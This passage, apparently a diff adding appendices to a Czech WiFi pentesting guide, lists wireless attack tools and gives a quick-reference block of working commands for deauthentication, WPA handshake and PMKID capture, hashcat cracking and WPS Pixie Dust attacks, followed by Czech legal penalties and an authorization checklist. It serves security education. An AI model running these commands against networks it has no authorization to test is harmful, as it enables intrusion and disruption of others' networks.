+|Nástroj|Kategorie|Popis|
+|---|---|---|
+|`airmon-ng`|Příprava|Správa monitor módu|
+|`airodump-ng`|Průzkum|Zachytávání WiFi provozu, průzkum sítí|
+|`aireplay-ng`|Útok|Packet injection, deauth útoky, falešná auth|
+|`aircrack-ng`|Cracking|Cracking WEP a WPA klíčů|
+|`airbase-ng`|Falešný AP|Vytvoření softwarového AP|
+|`airdecap-ng`|Dekryptování|Dekryptování WEP/WPA zachycených souborů|
+|`hcxdumptool`|Zachycení|PMKID a handshake zachycení|
+|`hcxpcapngtool`|Konverze|Konverze pcap → hashcat formáty|
+|`hashcat`|Cracking|GPU-accelerated password cracking|
+|`john`|Cracking|CPU password cracker|
+|`reaver`|WPS|WPS PIN brute-force a Pixie Dust|
+|`bully`|WPS|Alternativní WPS nástroj|
+|`wash`|Skenování|Detekce WPS sítí|
+|`wifite2`|Automatizace|Automatizovaný WiFi auditor|
+|`kismet`|Monitorování|Wireless IDS/IPS/průzkum|
+|`wireshark`|Analýza|GUI packet analyzer|
+|`tshark`|Analýza|CLI packet analyzer|
+|`bettercap`|MITM|Síťový útočný framework|
+|`hostapd`|Falešný AP|Software AP daemon|
+|`hostapd-wpe`|Enterprise|Rogue RADIUS server|
+|`eaphammer`|Enterprise|WPA Enterprise útočný framework|
+|`wifiphisher`|Evil Twin|Automatizovaný Evil Twin|
+|`mdk4`|DoS|WiFi DoS testování|
+|`crunch`|Wordlisty|Generátor hesel / wordlistů|
+|`cewl`|Wordlisty|Web scraper pro wordlisty|
+|`pyrit`|Cracking|GPU WPA cracker s databází|
+|`cowpatty`|Cracking|WPA offline cracker|
+
+---
+
+## Appendix B: Rychlá reference příkazů
+
+```bash
+# Monitor mód ON/OFF
+sudo airmon-ng start/stop wlan0
+
+# Skenování sítí
+sudo airodump-ng wlan0mon
+
+# Zachycení handshake
+sudo airodump-ng -c [CH] --bssid [BSSID] -w capture wlan0mon
+sudo aireplay-ng -0 5 -a [BSSID] -c [CLIENT] wlan0mon
+
+# PMKID zachycení
+sudo hcxdumptool -o pmkid.pcapng -i wlan0mon --enable_status=1
+
+# Konverze pro hashcat
+hcxpcapngtool -o hash.hc22000 capture.cap
+
+# Cracking
+hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
+
+# WPS Pixie Dust
+sudo reaver -i wlan0mon -b [BSSID] -K 1 -vvv
+
+# Automatický útok
+sudo wifite --wpa --wps --dict rockyou.txt
+```
+
+---
+
+## Appendix C: Legální aspekty v ČR
+
+```
+§ 230 Trestního zákoníku ČR — Neoprávněný přístup k počítačovému systému:
+  - Odst. 1: Trest odnětí svobody až na 2 roky (nebo zákaz činnosti)
+  - Odst. 2: Trest odnětí svobody až na 3 roky (při způsobení škody)
+  - Odst. 3: Trest odnětí svobody 1-5 let (organizovaná skupina, větší škoda)
+
+Před zahájením WiFi pentestingu VŽDY zajistit:
+  ✅ Písemný souhlas vlastníka sítě
+  ✅ Definovaný scope (které sítě, kdy, odkud)
+  ✅ Rules of Engagement dokument
+  ✅ Kontakt na zodpovědnou osobu
+  ✅ Pojištění profesní odpovědnosti
+  ✅ Záloha veškeré dokumentace
+
+Doporučené certifikace pro legální WiFi pentest:
+  - Offensive Security WiFu (OSWP)
+  - Certified Wireless Security Professional (CWSP)
+  - Certified Ethical Hacker (CEH)
+  - CompTIA Security+
+```
+
+---
+
+> **📚 Další vzdělávání:**
+> 
+> - Offensive Security OSWP (WiFu) kurz
+> - TryHackMe — WiFi Hacking path
+> - HackTheBox — Wireless challenges
+> - Kniha: "Hacking Exposed Wireless" — Johnny Cache
+
+> **🔧 Cvičná prostředí:**
+> 
+> - Vlastní testovací AP doma
+> - WiFi Pineapple (Hak5) — hardware pro WiFi audity
+> - Virtuální lab s softAP v Kali
